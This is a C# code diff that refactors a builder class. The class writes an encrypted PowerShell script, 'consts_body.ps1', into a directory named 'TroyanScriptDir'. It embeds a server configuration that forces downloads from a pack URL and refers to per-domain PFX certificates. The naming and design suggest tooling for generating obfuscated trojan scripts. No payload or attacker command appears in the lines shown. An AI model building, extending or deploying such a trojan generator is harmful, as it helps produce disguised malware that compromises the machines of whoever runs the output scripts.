@@ -18,7 +18,11 @@ public abstract partial class CustomBuilder
     protected abstract string[] PriorityTasks { get; }
     protected abstract string[] UnpriorityTasks { get; }
 
-    private ServerModelLoader _loader = null!;
+    private ServerService _serverService = null!;
+    private ServerLayoutPaths _layout = null!;
+
+    /// <summary>Per-server and repo layout paths; set at the start of <see cref="Build"/>.</summary>
+    protected ServerLayoutPaths L => _layout;
 
     protected ServerModel Model = new();
     protected PackItem? PackItem = null;
@@ -32,10 +36,11 @@ public abstract partial class CustomBuilder
     private readonly StringBuilder Builder = new();
     protected readonly List<string> Result = new();
 
-    public virtual List<string> Build(string server, string packId, ServerModelLoader loader)
+    public virtual List<string> Build(string server, string packId, ServerService serverService)
     {
-        _loader = loader;
-        var srv = loader.LoadServer(server);
+        _serverService = serverService;
+        _layout = serverService.Layout();
+        var srv = serverService.GetServerLite();
         Model = srv;
         if (!string.IsNullOrWhiteSpace(packId))
             PackItem = Model.Pack.Items.FirstOrDefault(a=> a.Id == packId);
@@ -78,13 +83,15 @@ _SERVER
         };
 
         var tempFile = Path.GetTempFileName();
-        File.Copy(Model.UserServerFile, tempFile, true);
+        File.Copy(L.UserServerFile, tempFile, true);
         if (PackItem != null)
         {
-            var m = _loader.LoadServerFile(tempFile);
+            var m = _serverService.Loader.LoadFileInternal(tempFile);
+            m.PanelHomeDirectory = _serverService.Paths.UserDataDir;
+            m.Refresh();
             m.StartDownloadsForce = true;
             m.StartDownloads = new List<string>() { PackItem.OriginalUrl };
-            _loader.SaveServerFile(tempFile, m);
+            _serverService.Loader.SaveFile(tempFile, m);
         }
 
         var serverFilePath = tempFile;
@@ -106,7 +113,7 @@ _SERVER
         var serverJsonString = JsonSerializer.Serialize(filteredObject, new JsonSerializerOptions { WriteIndented = true });
         template = template.Replace("_SERVER", serverJsonString);
 
-        var outputPath = Path.Combine(Model.TroyanScriptDir, "consts_body.ps1");
+        var outputPath = Path.Combine(L.TroyanScriptDir, "consts_body.ps1");
         File.WriteAllText(outputPath, template);
     }
 
@@ -114,28 +121,6 @@ _SERVER
     private void Build()
     {
         BuildRelease();
-    }
-
-    private void BuildDebug()
-    {
-        foreach (var x in NonDoFiles)
-        {
-            Builder.Append(x.Data);
-            Builder.AppendLine();
-        }
-        Builder.AppendLine("");
-        foreach (var x in DoFiles)
-        {
-            Builder.Append(x.Data);
-            Builder.AppendLine();
-        }
-        foreach (var sourceFile in DoFiles)
-        {
-            var doX = $"do_{sourceFile.Name}";
-            Builder.AppendLine(doX);
-        }
-
-        File.WriteAllText(OutputFile,Builder.ToString());
     }
 
     private void BuildRelease()
@@ -154,11 +139,7 @@ _SERVER
 
             var key = kvp.Name;
             var renamedKey = key;
-            if (Program.RandomDo)
-            {
-                renamedKey = kvp.Name;
-                renamed.Add(kvp.Name, renamedKey);
-            }
+
 
             psString.AppendLine($"    \"{renamedKey}\" = \"{kvp.CryptedData(renamed)}\"");
         }
@@ -187,7 +168,7 @@ _SERVER
 
     protected string PfxFile(string domain)
     {
-        return Path.Combine(Model.CertDir, domain + ".pfx");
+        return Path.Combine(L.CertDir, domain + ".pfx");
     }
 
     static (string Head, string Body) ExtractHeadAndBody(string input)
